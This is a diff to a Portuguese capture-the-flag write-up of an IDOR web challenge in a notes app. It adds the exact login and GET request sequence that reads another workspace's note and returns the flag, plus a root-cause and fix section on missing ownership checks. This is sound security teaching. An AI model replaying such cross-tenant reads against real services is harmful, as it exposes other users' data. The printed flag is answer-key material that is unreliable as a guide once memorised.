@@ -1,8 +1,9 @@
 ---
 title: 'Nota — Writeup completo'
-description: 'IDOR direto: um endpoint de leitura de notas exporta qualquer arquivo de qualquer workspace, bastando estar autenticado com uma sessão qualquer.'
+description: '"Nota" é, literalmente, um app de anotações — e a ironia é dupla: a própria flag mora dentro de uma nota comum, que qualquer pessoa logada conseguia ler, mesmo sem nenhuma relação com quem criou aquela nota.'
 event: 'Infinity CTF 2026 (Harpia Security + SENAC)'
 category: 'web'
+subcategory: 'IDOR'
 difficulty: 'medium'
 tags:
   - idor
@@ -13,7 +14,7 @@ draft: false
 
 > [!NOTE/Sobre o desafio]
 > **Plataforma:** Infinity CTF 2026 (Harpia Security + SENAC)
-> **Categoria:** Web · **Dificuldade:** Medium · **Pontos:** 306
+> **Categoria:** Web · **Dificuldade:** Medium · **Pontos:** 287
 > **Vulnerabilidades:** IDOR — leitura de recurso sem checar se pertence à sessão autenticada
 > **Flag:** `flag{infinity_ctf_2026_nota_e0c2571fee}`
 
@@ -72,8 +73,26 @@ GET /notas/suporte-vip.txt
 ## 4. Exploração
 
 A resposta ao `GET /notas/suporte-vip.txt`, mesmo autenticado com um workspace completamente
-diferente, devolveu o conteúdo da nota normalmente — sem nenhum erro de permissão. Não foi
-necessário nenhum bypass adicional: a "vulnerabilidade" e a "exploração" são a mesma requisição.
+diferente, devolveu o conteúdo da nota normalmente — sem nenhum erro de permissão:
+
+```
+POST /login
+Content-Type: application/json
+
+{"usuario": "workspace-qualquer-123"}
+
+→ 200 OK, Set-Cookie: session=<...>
+
+GET /notas/suporte-vip.txt
+Cookie: session=<...>
+
+→ 200 OK
+flag{infinity_ctf_2026_nota_e0c2571fee}
+```
+
+Não foi necessário nenhum bypass adicional além de estar logado com QUALQUER workspace: a
+"vulnerabilidade" e a "exploração" são, literalmente, a mesma requisição — não existe um segundo
+passo de escalada como nos outros desafios deste ciclo.
 
 ## 5. Capturando a flag
 
@@ -83,7 +102,24 @@ O conteúdo da nota `suporte-vip.txt` era a flag:
 flag{infinity_ctf_2026_nota_e0c2571fee}
 ```
 
-## 6. Lições
+## 6. Por que a aplicação era vulnerável (e como corrigir)
+
+A causa raiz é a ausência completa de uma checagem de posse (ownership) no endpoint de leitura — ele
+verifica apenas "existe uma sessão válida", nunca "essa nota pertence a essa sessão".
+
+1. **Toda leitura/escrita de um recurso "pertencente a alguém" precisa incluir explicitamente a
+   condição de posse na consulta** — algo equivalente a
+   `WHERE titulo = ? AND workspace = <workspace da sessão>` — nunca assumir que o identificador do
+   recurso na URL já implica posse.
+2. **Autenticação não deveria, por si só, já valer como autorização.** Mesmo que a autenticação
+   fosse mais robusta (com senha de verdade), o bug continuaria existindo enquanto o servidor não
+   checasse dono do recurso — os dois problemas são independentes e a correção de um não resolve o
+   outro.
+3. **Fortalecer o login (exigir senha real) reduziria o alcance do ataque, mas não o eliminaria.**
+   Um atacante com uma conta legítima em qualquer workspace ainda conseguiria ler notas de outros
+   workspaces até a checagem de posse ser implementada.
+
+## 7. Lições
 
 - **Autenticação (você é alguém?) e autorização (você pode acessar ESTE recurso específico?) são
   checagens diferentes, e um sistema precisa das duas.** É comum um endpoint verificar só a
@@ -92,6 +128,8 @@ flag{infinity_ctf_2026_nota_e0c2571fee}
   IDOR.** Se o nome do arquivo/nota fosse um identificador aleatório e não-adivinhável, o bug de
   autorização continuaria existindo, mas explorá-lo exigiria descobrir o nome primeiro — o que já
   eleva a dificuldade real do ataque, mesmo sem corrigir a causa raiz.
+- **IDOR costuma ser a primeira hipótese a testar** sempre que "estar logado" e "ser dono do
+  recurso" parecem, na superfície, estar sendo tratados como a mesma coisa pela aplicação.
 - **Em sistemas multi-tenant, todo endpoint de leitura/escrita de um recurso "pertencente a alguém"
   precisa incluir explicitamente `WHERE workspace = <workspace da sessão>` (ou equivalente) na
   consulta** — nunca confiar que o identificador do recurso na URL já implica posse.
